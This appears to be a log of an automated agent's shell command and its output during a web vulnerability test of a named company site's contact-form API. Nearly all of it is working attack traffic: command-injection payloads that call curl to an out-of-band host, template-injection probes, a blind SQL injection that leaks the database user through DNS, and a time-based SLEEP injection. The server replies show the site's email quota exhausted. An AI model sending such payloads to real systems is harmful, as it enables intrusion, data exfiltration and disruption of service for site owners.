@@ -1,0 +1,30 @@
+# command: cd /work; UA="Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+T="vapt@www.infinitycapital.bh"
+OOB="oobcbef74262f00.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
+sq() { curl -s -o /tmp/o -w "HTTP=%{http_code} sz=$(stat -c%s /tmp/o 2>/dev/null) " -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F "fname=A" -F "lname=B" -F "areacode=388" -F "tel=1" -F "cname=c" -F "subject=s" -F "msg=$2" -F "check=1" -F "targets=$1"; head -c 110 /tmp/o; echo; }
+echo "--- CMDi backticks in msg ---"; sq "$T" 'm\`id\`'
+echo "--- CMDi \$() in msg ---"; sq "$T" 'm$(curl http://'"$OOB"'/cmd_i_msg)'
+echo "--- CMDi ; pipe in subject ---"; curl -s -o /tmp/o2 -w "HTTP=%{http_code} " -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F "fname=A" -F "lname=B" -F "areacode=388" -F "tel=1" -F "cname=c" -F 'subject=s; curl http://'"$OOB"'/cmd_i_subj' -F "msg=m" -F "check=1" -F "targets=$T"; head -c 110 /tmp/o2; echo
+echo "--- CMDi in fname ---"; curl -s -o /tmp/o3 -w "HTTP=%{http_code} " -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F 'fname=$(curl http://'"$OOB"'/cmd_i_fname)' -F "lname=B" -F "areacode=388" -F "tel=1" -F "cname=c" -F "subject=s" -F "msg=m" -F "check=1" -F "targets=$T"; head -c 110 /tmp/o3; echo
+echo "--- SSTI arithmetic in msg (expect 49 if evaluated) ---"; sq "$T" 'x{{7*7}}y${7*7}z<%= 7*7 %>w#{7*7}'
+echo "--- blind SQLi DNS oracle in msg ---"; sq "$T" "m'||(SELECT LOAD_FILE(CONCAT('//',SUBSTRING((SELECT user()),1,2),'.oob8e34b57432ee.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in')))||'"
+echo "--- blind SQLi time-based in areacode ---"; curl -s -o /tmp/o5 -w "HTTP=%{http_code} t=%{time_total}\n" -X POST "https://www.infinitycapital.bh/api/send" -H "User-Agent: $UA" -F "fname=A" -F "lname=B" -F "areacode=388' OR SLEEP(5)-- -" -F "tel=1" -F "cname=c" -F "subject=s" -F "msg=m" -F "check=1" -F "targets=$T"
+# tool: head
+# exit_code: 0
+# ts: 2026-09-30T11:36:04.387972+00:00
+# ---
+
+--- CMDi backticks in msg ---
+HTTP=200 sz=27355 {"data":{"id":"01a0f219-a4ca-754e-9e1d-a203d5faf7bc"},"error":null}
+--- CMDi $() in msg ---
+HTTP=200 sz=67 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"
+--- CMDi ; pipe in subject ---
+HTTP=200 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"
+--- CMDi in fname ---
+HTTP=200 {"data":null,"error":{"message":"You have reached your monthly email sending quota.","name":"monthly_quota_exc
+--- SSTI arithmetic in msg (expect 49 if evaluated) ---
+HTTP=200 sz=135 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"
+--- blind SQLi DNS oracle in msg ---
+HTTP=200 sz=135 {"data":null,"error":{"statusCode":429,"message":"You have reached your monthly email sending quota.","name":"
+--- blind SQLi time-based in areacode ---
+HTTP=200 t=0.361576
